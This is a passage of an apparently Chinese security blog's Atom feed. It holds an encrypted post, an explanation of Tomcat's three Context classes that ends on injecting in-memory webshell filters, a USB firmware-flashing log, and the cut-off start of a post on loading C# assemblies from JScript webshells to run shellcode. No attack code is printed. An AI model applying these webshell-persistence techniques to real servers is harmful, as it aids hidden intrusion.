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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      As-Exploits内存马兼容Spring
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>关于Tomcat中的三个Context的理解</title>
    <link href="https://yzddmr6.tk/posts/tomcat-context/"/>
    <id>https://yzddmr6.tk/posts/tomcat-context/</id>
    <published>2021-03-16T00:31:50.000Z</published>
    <updated>2021-03-15T08:34:32.605Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><p>p牛在知识星球里问了一个问题：Tomcat中这三个StandardContext、ApplicationContext、ServletContext都是干什么的</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615783546397-3d81b048-fdc8-47a9-b395-1dac64638e0a.png" alt="image.png"></p><p>skay师傅给出了自己的理解：<a href="https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew</a></p><p>这里来讲一讲我的理解，说的不一定对，仅供参考。</p><h3 id="Context">Context</h3><p>context是上下文的意思，在java中经常能看到这个东西。那么到底是什么意思呢？</p><p>根据我的理解，如果把某次请求比作电影中的事件，那么context就相当于事件发生的背景。例如一部电影中的某个镜头中，张三大喊“奥利给”，但是只看这一个镜头我们不知道到底发生了什么，张三是谁，为什么要喊“奥利给”。所以就需要交代当时事情发生的背景。张三是吃饭前喊的奥利给？还是吃饭后喊的奥利给？因为对于同一件事情：张三喊奥利给这件事，发生的背景不同意义可能是不同的。吃饭前喊奥利给可能是饿了的意思，吃饭后喊奥利给可能是说吃饱了的意思。在WEB请求中也如此，在一次request请求发生时，背景，也就是context会记录当时的情形：当前WEB容器中有几个filter，有什么servlet，有什么listener，请求的参数，请求的路径，有没有什么全局的参数等等。</p><h3 id="ServletContext">ServletContext</h3><p>ServletContext是Servlet规范中规定的ServletContext接口，一般servlet都要实现这个接口。大概就是规定了如果要实现一个WEB容器，他的Context里面要有这些东西：获取路径，获取参数，获取当前的filter，获取当前的servlet等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">package javax.servlet;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">public interface ServletContext &#123;</span><br><span class="line">    String TEMPDIR = &quot;javax.servlet.context.tempdir&quot;;</span><br><span class="line">    String ORDERED_LIBS = &quot;javax.servlet.context.orderedLibs&quot;;</span><br><span class="line"></span><br><span class="line">    String getContextPath();</span><br><span class="line"></span><br><span class="line">    ServletContext getContext(String var1);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    /** @deprecated */</span><br><span class="line">    @Deprecated</span><br><span class="line">    Servlet getServlet(String var1) throws ServletException;</span><br><span class="line"></span><br><span class="line">    /** @deprecated */</span><br><span class="line">    @Deprecated</span><br><span class="line">    Enumeration&lt;Servlet&gt; getServlets();</span><br><span class="line"></span><br><span class="line">    /** @deprecated */</span><br><span class="line">    @Deprecated</span><br><span class="line">    Enumeration&lt;String&gt; getServletNames();</span><br><span class="line"></span><br><span class="line">    void log(String var1);</span><br><span class="line"></span><br><span class="line">    /** @deprecated */</span><br><span class="line">    @Deprecated</span><br><span class="line">    void log(Exception var1, String var2);</span><br><span class="line"></span><br><span class="line">    void log(String var1, Throwable var2);</span><br><span class="line"></span><br><span class="line">    String getRealPath(String var1);</span><br><span class="line"></span><br><span class="line">    String getServerInfo();</span><br><span class="line"></span><br><span class="line">    String getInitParameter(String var1);</span><br><span class="line"></span><br><span class="line">    Enumeration&lt;String&gt; getInitParameterNames();</span><br><span class="line"></span><br><span class="line">    boolean setInitParameter(String var1, String var2);</span><br><span class="line"></span><br><span class="line">    Object getAttribute(String var1);</span><br><span class="line"></span><br><span class="line">    Enumeration&lt;String&gt; getAttributeNames();</span><br><span class="line"></span><br><span class="line">    void setAttribute(String var1, Object var2);</span><br><span class="line"></span><br><span class="line">    void removeAttribute(String var1);</span><br><span class="line"></span><br><span class="line">    String getServletContextName();</span><br><span class="line"></span><br><span class="line">    Dynamic addServlet(String var1, String var2);</span><br><span class="line"></span><br><span class="line">    Dynamic addServlet(String var1, Servlet var2);</span><br><span class="line"></span><br><span class="line">    Dynamic addServlet(String var1, Class&lt;? extends Servlet&gt; var2);</span><br><span class="line"></span><br><span class="line">    Dynamic addJspFile(String var1, String var2);</span><br><span class="line"></span><br><span class="line">    &lt;T extends Servlet&gt; T createServlet(Class&lt;T&gt; var1) throws ServletException;</span><br><span class="line"></span><br><span class="line">    ServletRegistration getServletRegistration(String var1);</span><br><span class="line"></span><br><span class="line">    Map&lt;String, ? extends ServletRegistration&gt; getServletRegistrations();</span><br><span class="line"></span><br><span class="line">    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, String var2);</span><br><span class="line"></span><br><span class="line">    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Filter var2);</span><br><span class="line"></span><br><span class="line">    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Class&lt;? extends Filter&gt; var2);</span><br><span class="line"></span><br><span class="line">    &lt;T extends Filter&gt; T createFilter(Class&lt;T&gt; var1) throws ServletException;</span><br><span class="line"></span><br><span class="line">    FilterRegistration getFilterRegistration(String var1);</span><br><span class="line"></span><br><span class="line">    Map&lt;String, ? extends FilterRegistration&gt; getFilterRegistrations();</span><br><span class="line"></span><br><span class="line">    SessionCookieConfig getSessionCookieConfig();</span><br><span class="line"></span><br><span class="line">    void setSessionTrackingModes(Set&lt;SessionTrackingMode&gt; var1);</span><br><span class="line"></span><br><span class="line">    Set&lt;SessionTrackingMode&gt; getDefaultSessionTrackingModes();</span><br><span class="line"></span><br><span class="line">    Set&lt;SessionTrackingMode&gt; getEffectiveSessionTrackingModes();</span><br><span class="line"></span><br><span class="line">    void addListener(String var1);</span><br><span class="line"></span><br><span class="line">    &lt;T extends EventListener&gt; void addListener(T var1);</span><br><span class="line"></span><br><span class="line">    void addListener(Class&lt;? extends EventListener&gt; var1);</span><br><span class="line"></span><br><span class="line">    &lt;T extends EventListener&gt; T createListener(Class&lt;T&gt; var1) throws ServletException;</span><br><span class="line"></span><br><span class="line">    JspConfigDescriptor getJspConfigDescriptor();</span><br><span class="line"></span><br><span class="line">    ClassLoader getClassLoader();</span><br><span class="line"></span><br><span class="line">    void declareRoles(String... var1);</span><br><span class="line"></span><br><span class="line">    String getVirtualServerName();</span><br><span class="line"></span><br><span class="line">    int getSessionTimeout();</span><br><span class="line"></span><br><span class="line">    void setSessionTimeout(int var1);</span><br><span class="line"></span><br><span class="line">    String getRequestCharacterEncoding();</span><br><span class="line"></span><br><span class="line">    void setRequestCharacterEncoding(String var1);</span><br><span class="line"></span><br><span class="line">    String getResponseCharacterEncoding();</span><br><span class="line"></span><br><span class="line">    void setResponseCharacterEncoding(String var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ApplicationContext">ApplicationContext</h3><p>在Tomcat中，ServletContext规范的实现是ApplicationContext，因为门面模式的原因，实际套了一层ApplicationContextFacade。关于什么是门面模式具体可以看<a href="https://www.runoob.com/w3cnote/facade-pattern-3.html" target="_blank" rel="noopener">这篇文章</a>，简单来讲就是加一层包装。</p><p>其中ApplicationContext实现了ServletContext规范定义的一些方法，例如addServlet,addFilter等</p><h3 id="StandardContext">StandardContext</h3><p>StandardContext存在于org.apache.catalina.core.StandardContext。</p><p>实际上研究ApplicationContext的代码会发现，ApplicationContext所实现的方法其实都是调用的this.context中的方法</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791333561-80d3e967-f36a-4c49-a611-a329bdf1349b.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791389467-3fe1e723-84d1-4e8b-8dfb-8f5712665a6d.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791403712-f22001f0-8c10-4bb4-9ab9-7bc1fdbe8650.png" alt="image.png"></p><p>而这个this.context就是一个实例化的StandardContext对象。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615791137362-cd302e98-fe22-468f-ae9e-4f2085848df3.png" alt="image.png"></p><p>所以在我看来，StandardContext是Tomcat中真正起作用的Context，负责跟Tomcat的底层交互，ApplicationContext其实更像对StandardContext的一种封装。</p><p>用下面这张图来展示一下其中的关系</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615790929311-f1c15d6e-c317-41c2-9ea7-eadc91a691cf.png" alt="image"></p><p>回过头看内存马。以添加filter为例，从上面的分析我们可以知道ApplicationContext跟Standerdcontext这两个东西都有addFilter的方法。那么实际选用哪一个呢？其实两种办法都可以。三梦师傅在<a href="https://xz.aliyun.com/t/7388" target="_blank" rel="noopener">基于tomcat的内存 Webshell 无文件攻击技术</a>这篇文章里是利用反射修改了Tomcat的LifecycleState，绕过限制条件调用的ApplicationContext中的addFilter方法。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615795697048-8b5ba421-eb1d-45a9-8084-04127e0484a5.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615796887459-f6e8da3c-9941-418c-a02e-5d217b199aa6.png" alt="image.png"></p><p>但是因为实际上最终调用的还是StandardContext的addFilter方法，所以我们就可以直接调用StandardContext的addFilter方法进行绕过，从而省去了绕过一堆判断的过程。这种实现具体可以看这个师傅的<a href="https://mp.weixin.qq.com/s/nPAje2-cqdeSzNj4kD2Zgw" target="_blank" rel="noopener">公众号文章</a>。</p>]]></content>
    
    <summary type="html">
    
      关于Tomcat中的三个Context的理解
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>金士顿 DTSE9G2 128G U盘量产踩坑记</title>
    <link href="https://yzddmr6.tk/posts/make-usb-great-again/"/>
    <id>https://yzddmr6.tk/posts/make-usb-great-again/</id>
    <published>2021-03-02T13:12:19.000Z</published>
    <updated>2021-03-02T14:39:12.292Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>买过金士顿U盘的应该都知道一般金士顿是不支持bitlocker的，但是这样又很不方便，就想捣鼓一下。</p><p>从naivekun师傅那里知道了一个词叫量产，通过给U盘刷固件，就可以让U盘被识别为一个CD或者硬盘，从而支持bitlocker。结果折腾了两天。。。踩了各种坑。一开始刷炸了之后128g缩水成32g，然后又捣鼓捣鼓救了回来，反而扩容到了132g？神秘。</p><h2 id="前期准备">前期准备</h2><p>型号：金士顿 DTSE9G2 128G</p><p>工具：ChipGenius</p><p>​ ST-TOOL_9000_v3.7F.92</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614689541756-5362b169-4462-417b-b4f2-d44ccc490832.png" alt="image.png"></p><h2 id="参数设置">参数设置</h2><p>下载工具解压后打开STTOOL_F1_90_v200_00_SZ.exe</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614688151229-50a092b2-09db-427f-aebd-6d2102274ada.png" alt="image.png"></p><p>点击更新识别U盘，然后进入设定</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614689662363-feb2c4a5-ce80-4699-8039-a346515d433b.png" alt="image.png"></p><p>固件档案中选择的是2309_hv3_ED3_T_1P.BIN而不是上文教程中的2309_hv3_ED3_M_1P.BIN。因为猜测M是mlc的意思，T是tlc的意思。ChipGenius中显示U盘是tlc，所以换成了2309_hv3_ED3_T_1P.BIN。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614683892494-b1015522-d629-48ee-ae81-7008806bf949.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684012623-d50d69a0-003b-4d66-886d-62e347fffb4f.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684027055-eb205961-d12a-4e78-8c8f-a52684d7c99b.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684032917-f90006df-a3cd-4ad8-b11e-1020cd1d27d5.png" alt="image.png"></p><p>这里选择容量优先</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684040144-39e6a18c-637d-492f-b635-1412d646a5f9.png" alt="image.png"></p><p>自己是已经低格一遍了，所以选的高格扫描，分类方式选择容量有限。</p><p>低格一次4-5个小时，高格一次3-5分钟左右。</p><p>因为我的CE是4个就选的4，Capacity是U盘容量大小，我选择的是自动，也可以设置指定大小。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684053391-17c96e20-72d3-4fdf-a456-fa9f600cf61d.png" alt="image.png"></p><p>搞完后点击保存，返回上个界面。</p><h2 id="坑">坑</h2><h3 id="0x01">0x01</h3><p>量产工具要在本机运行，不要在虚拟机里面运行，否则会提示奇奇怪怪的错误。被坑了好久</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614668632227-037b759a-8621-4177-957c-184e11772896.png" alt="image.png"></p><h3 id="0x02">0x02</h3><p>开始naivekun师傅是按照这个教程来的[<a href="http://bbs.wuyou.net/forum.php?mod=viewthread&amp;tid=417696&amp;extra=&amp;page=1" target="_blank" rel="noopener">教程] 群联PS2251-09(PS2309)U盘量产</a>，刷完之后发现128g缩水到了32g。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614690324324-8c7b51f5-adbb-493d-a0a8-f4c432f1d4b5.png" alt="image.png"></p><p>帖子下面也有人出现了同样的问题</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614687752396-f7b44df1-42a1-4e24-86db-16584babd2a3.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614687777323-22850737-7ba0-447b-acbf-b17a29c0310b.png" alt="image.png"></p><p>64g的没事，128g的就缩水。刚开始以为是CE太多，固件不兼容啥的，后来发现其实是因为工具默认使用的是速度优先策略，会把低速数据块抛弃，才会导致量产后容量变小但是用起来非常顺畅。</p><h3 id="0x03">0x03</h3><p>格完之后不要急着拔U盘，在U盘里新建一个文件再拔，否则再次插入会不识别U盘。神秘</p><h2 id="量产过程">量产过程</h2><p>第一次是选择了低格+高格，贼鸡儿慢。。。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614668605274-d497a6d0-19ff-4916-b47b-e65b912824ce.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614676197893-ba7e74f2-071f-4d76-ad1a-039e1f0fada3.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614679572568-ecfaa77a-0d4d-4d8f-ad6a-540b7999e948.png" alt="image.png"></p><p>完事之后去看设备管理器发现已经量产成功，但是拔出U盘再插入就会无法识别。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614679583008-244d50f7-11c3-43a3-a69a-33ec0a3afd61.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614679638921-0155c412-640c-4385-b6b8-f70d3aacdf32.png" alt="image.png"></p><p>后来用高格又刷了一遍，刚刷完之后没先拔出来，在U盘里新建了一个txt，然后拔出U盘，再次读取，成功识别！</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614688796939-70295c46-4cb4-4065-a845-4ffbbca57955.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684188015-a9c246de-2e40-4a9a-83ec-fdb333888456.png" alt="image.png"></p><p>但是怎么变成132g了。。。还扩容了呢</p><p>测试一下读写</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614680458215-70378558-68c5-4766-9c7a-722b99bc2df4.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684204711-1e265145-f084-45f6-816d-0438c28511f2.png" alt="image.png"></p><p>360U盘鉴定一下容量</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614683314738-5a322691-ffea-4bf6-a9ed-3673ebf78190.png" alt="image.png"></p><p>还行吧，预期范围之内</p><p>选中U盘右键，终于出现了bitlocker的选项。。。</p><p>加密驱动器，成功！</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1614684982853-e045b1c0-32e3-47e6-ab9b-6df341695b18.png" alt="image.png"></p><h2 id="最后">最后</h2><p>没事还是不要搞量产orz。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;买过金士顿U盘的应该都知道一般金士顿是不支持bitlocker的，但是这样又很不方便，就想捣鼓一下。&lt;/p&gt;&lt;p&gt;从naivekun师傅那里知道了一
      
    
    </summary>
    
    
      <category term="随便写写" scheme="https://yzddmr6.tk/categories/%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/"/>
    
    
  </entry>
  
  <entry>
    <title>Jscript加载Assembly踩坑记</title>
    <link href="https://yzddmr6.tk/posts/jscript-load-csharp-assembly/"/>
    <id>https://yzddmr6.tk/posts/jscript-load-csharp-assembly/</id>
    <published>2021-01-27T08:03:47.000Z</published>
    <updated>2021-01-27T08:05:42.555Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>最近想要给As-Exploits增加aspx类型的支持，就研究了一下冰蝎跟哥斯拉的实现。</p><p>由于冰蝎跟哥斯拉都采用的C#类型的shell，所以可以直接调用系统的一些api，并且可以加载任意的shellcode。而蚁剑采用的是传统的Jscript。就想找个办法把它们两者结合起来，用Jscript加载C#的assembly，以此来达到兼容原有shell类型的目的。</p><p>但是在实现的过程中踩了一些坑，所以就写下这篇文章记录一下。</p><h2 id="理论支持">理论支持</h2><h3 id="Assembly">Assembly</h3><p>这里要先提到一个概念叫Assembly，引用一下rebeyond师傅文章中的话：<a href="https://xz.aliyun.com/t/2758" target="_blank" rel="noopener">https://xz.aliyun.com/t/2758</a></p><blockquote><p>在Java中，每个类经过编译之后都单独对应一个class文件，而在.net中则不同，.net中不存在单个类对应的二进制文件，而是引入了一个叫做Assembly（程序集）的概念，已编译的类是以Assembly的形式来承载的，Assembly是供CLR执行的可执行文件。在.NET下，托管的DLL和EXE都称之为Assembly，一个Assembly可以包含多个类。</p></blockquote><p>java跟.net有很多相似之处，这里我们可以简单的理解为：.net中的assembly就像java中的class。java中使用defineClass来加载一个类到jvm内存中，同样，.net中可以使用Assembly.Load来把assembly加载到内存中。</p><h3 